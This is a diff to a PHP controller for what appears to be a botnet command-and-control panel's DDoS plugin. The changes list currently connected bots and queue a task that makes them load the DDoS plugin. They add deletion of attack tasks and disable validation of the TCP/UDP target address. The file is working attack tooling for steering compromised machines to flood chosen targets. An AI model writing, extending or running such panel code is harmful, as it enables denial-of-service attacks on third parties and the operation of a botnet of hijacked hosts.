@@ -6,14 +6,25 @@ class ddosController{
     {
         $GLOBALS["template"][0] = get_plugin_base_dir("ddos") . "/template/ddos";
     }
-
+    public function ddosinfo(){
+        $GLOBALS["template"][1] = "ddosinfo";
+        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_avalible WHERE lastseen >= ?");
+        $statement->execute(array(time()-5));
+        $bots = array();
+        while($row = $statement->fetch()) {
+            $bots[] = $row;
+        }
+        $GLOBALS["tpl"]->assign("bots",$bots);
+    }
     public function ddoshub()
     {
         $GLOBALS["template"][1] = "ddoshub";
 
         if(!empty($_POST["load-ddosBots"])){
-            echo $_POST["load-ddosBots"];
-            die("TOdo Begin Loading task");
+
+            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task, execution_limit) VALUES (?, ?, ?, ?, ?)");
+            $statement->execute(array("", 1, $GLOBALS["task_configuration"]["ddos"]["value"], "runplugin", $_POST["load-ddosBots"]));
+            header("Location: /ddos");
         }
 
         if(!empty($_POST["method"])){
@@ -24,7 +35,7 @@ class ddosController{
             }
             if($_POST["method"] == "tcp" || $_POST["method"] == "udp"){
                 if (filter_var($_POST["targetip"], FILTER_VALIDATE_IP) === FALSE) {
-                    die('Not a valid IP');
+                 //   die('Not a valid IP');
                 }
             }
             if(!is_int(intval($_POST["maxtime"]))){
@@ -49,7 +60,10 @@ class ddosController{
             $statement->execute(array($status, $_POST["changeTask"]));
             Header("Refresh:0;");
         }
-
+        if(!empty($_POST["delete"])){
+            $statement = $GLOBALS["pdo"]->prepare("DELETE FROM ddos_tasks WHERE id = ?");
+            $statement->execute(array($_POST["delete"]));
+        }
         $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_avalible WHERE lastseen >= ?");
         $statement->execute(array(time()-5));
         $bots = array();
